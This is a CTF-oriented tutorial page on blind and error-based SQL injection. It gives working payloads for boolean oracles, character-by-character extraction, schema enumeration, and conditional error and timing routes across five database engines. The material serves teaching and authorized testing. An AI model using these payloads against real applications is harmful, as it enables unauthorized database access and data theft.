---
title: "07 · SQLi — Blind / Error"
weight: 16
bookToc: true
---

# Blind and Error-Based SQLi

**Blind SQLi means no direct data output. You still need a reliable oracle.** A change in row visibility, message, HTTP status, exception, or response time can answer one yes/no question per probe.

## 1. Establish the oracle before extracting

Choose a known existing ID and preserve the original request/session:

```sql
1 AND 1=1
1 AND 1=2
```

For a quoted value:

```sql
apple' AND 1=1-- -
apple' AND 1=2-- -
```

Repeat baseline → true → false → true. Define the exact observable result:

```text
TRUE  = response JSON contains product id 1
FALSE = response JSON has an empty products array
ERROR = backend syntax error / separate status
```

Do not classify every non-TRUE response as FALSE. CSRF failures, connection timeouts, rate limits, generic errors, and expired cookies are separate outcomes.

## 2. Pick the scalar expression

| Engine | Example target expression | Character code at position 1 |
| --- | --- | --- |
| MySQL | `(SELECT flag FROM flags ORDER BY id LIMIT 1)` | `ASCII(SUBSTRING(EXPR,1,1))` |
| PostgreSQL | `(SELECT flag FROM public.flags ORDER BY id LIMIT 1)` | `ascii(substring(EXPR,1,1))` |
| SQLite | `(SELECT flag FROM flags ORDER BY id LIMIT 1)` | `unicode(substr(EXPR,1,1))` |
| SQL Server | `(SELECT TOP 1 flag FROM dbo.flags ORDER BY id)` | `ASCII(SUBSTRING(EXPR,1,1))` |
| Oracle | `(SELECT FLAG FROM FLAGS WHERE ID=1)` | `ASCII(SUBSTR(EXPR,1,1))` |

`EXPR` is notation; replace it with the actual scalar expression, including parentheses. Enumerate table/column names with engine catalogs if unknown. Confirm the row exists before comparing a NULL result.

## 3. Extract length first

MySQL example, numeric injection:

```sql
1 AND LENGTH((SELECT flag FROM flags ORDER BY id LIMIT 1))>16
1 AND LENGTH((SELECT flag FROM flags ORDER BY id LIMIT 1))>32
1 AND LENGTH((SELECT flag FROM flags ORDER BY id LIMIT 1))>24
```

If `>16` is true, `>32` false, and `>24` true, the length is in 25–32. Keep splitting that interval. Verify the final candidate with `=N`.

SQL Server uses `LEN` (trailing spaces ignored); engines differ on byte versus character length. For ASCII CTF flags this is usually simple; use hex if the representation is uncertain.

## 4. Extract each character manually

Example first-character ASCII binary search:

```sql
1 AND ASCII(SUBSTRING((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>79
1 AND ASCII(SUBSTRING((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>103
1 AND ASCII(SUBSTRING((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>91
```

Use the previous answer to choose the next threshold. For printable ASCII, start with an appropriate interval such as 32–126, then verify equality. Characters outside that range require a broader range / hex strategy.

| Answer to `code > midpoint` | New interval |
| --- | --- |
| TRUE | `midpoint+1` through current upper bound |
| FALSE, with a valid normal response | Current lower bound through `midpoint` |
| Transport / backend error | Repeat or repair the request; do not update bounds |

After confirming position 1, change the position to 2, then 3. Offsets are 1-indexed in the listed substring functions.

Final verification:

```sql
1 AND (SELECT flag FROM flags ORDER BY id LIMIT 1)='flag{recovered_value}'
```

Case-insensitive collations can make string equality ambiguous; compare character codes / binary or hex values if case matters.

## 5. Enumerate schema with the same method

First answer existence, then count, then read one ordered item:

```sql
1 AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='flags')
1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())>3
1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>109
```

Those examples are MySQL. Use the catalog and pagination in the [matching engine guide](../sqli/#4-does-the-query-return-rows-into-the-response). Never assume the same table order between unqualified requests.

## 6. Error-based routes

### Detailed conversion errors

```sql
-- PostgreSQL, numeric context
1 AND CAST((SELECT current_database()) AS integer)=1

-- SQL Server, numeric context
1 AND CONVERT(int,DB_NAME())=1
```

If exception text includes the converted value, it is direct disclosure. If only error/no-error changes, make the conversion conditional using engine-specific syntax and treat it as a boolean oracle. PostgreSQL planners can evaluate constant invalid expressions early; a paired test is essential.

### Oracle conditional error

```sql
1 AND (SELECT CASE WHEN LENGTH(USER)>5 THEN TO_CHAR(1/0) ELSE 'ok' END FROM dual)='ok'
```

### SQLite conditional error

```sql
1 AND CASE WHEN length(sqlite_version())>5 THEN abs(-9223372036854775808) ELSE 1 END=1
```

SQLite division by zero is not a dependable exception. MySQL legacy XML function errors are version-dependent; verify function availability before choosing that route.

## 7. Time-based routes

| Engine | Conditional timing pattern | Prerequisite |
| --- | --- | --- |
| MySQL | `1 AND IF(CONDITION,SLEEP(2),0)=0` | Expression executed; beware once-per-row evaluation |
| PostgreSQL | `1 AND (SELECT 1 FROM pg_sleep(CASE WHEN CONDITION THEN 2 ELSE 0 END))=1` | Scalar subquery executes |
| SQL Server | `1'; IF (CONDITION) WAITFOR DELAY '00:00:02'-- -` | Driver accepts this batch |
| SQLite | No standard sleep function | Prefer boolean/error oracle |
| Oracle | No general scalar sleep payload here | Package grants/context differ; prefer existing oracle |

Replace `CONDITION`, not the whole surrounding request. First test constant true/false with a short delay and a stable baseline. Then insert the extraction predicate.

```text
baseline, false, true, false, true
compare server response time across several repeats
if transport timeout → unknown, not automatically TRUE
```

Timing can be distorted by connection setup, jitter, queued work, caching, and retries. Keep requests sequential for manual calibration. Avoid heavy-query tricks that burden the service when a short sleep or boolean difference is available.

## 8. Final checklist

- Correct database, schema, stable row, and scalar result?
- Correct string quote / parenthesis / comment closure?
- Distinguishing NULL, empty string, false, and an exception?
- Stable cookies, CSRF token, route, content type, and no cache masking?
- Recovered length and final full equality both confirmed?

Reference: [PortSwigger blind SQLi](https://portswigger.net/web-security/sql-injection/blind). Engine-specific official references are linked from each database page.
